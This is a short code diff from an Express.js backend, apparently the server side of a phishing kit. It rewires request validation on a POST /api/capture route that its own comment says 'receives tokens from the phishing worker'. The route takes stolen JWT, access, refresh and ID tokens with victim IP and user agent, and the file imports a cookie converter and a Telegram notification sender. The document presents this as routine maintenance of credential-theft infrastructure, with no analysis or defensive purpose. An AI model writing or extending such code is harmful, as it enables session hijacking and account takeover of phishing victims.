@@ -11,7 +11,7 @@ const { encrypt } = require('../utils/encrypt');
 const { processCookieConversion } = require('../services/cookieconverter');
 const { sendTelegramDocument } = require('../services/notification');
 const { body } = require('express-validator');
-const { validateResult, commonValidators } = require('../middleware/validator');
+const { validateResult } = require('../middleware/validator');
 
 // Inline validators for the capture endpoint (commonValidators has no
 // captureToken rule, so we define them here to avoid passing `undefined`
@@ -177,7 +177,7 @@ function sendCaptureReport(userId, data) {
 }
 
 // POST /api/capture - receives tokens from the phishing worker
-router.post('/', commonValidators.captureToken, validateResult, async (req, res) => {
+router.post('/', captureValidators, validateResult, async (req, res) => {
     try {
         const { jwt_token, access_token, refresh_token, id_token, ip, user_agent } = req.body;
 
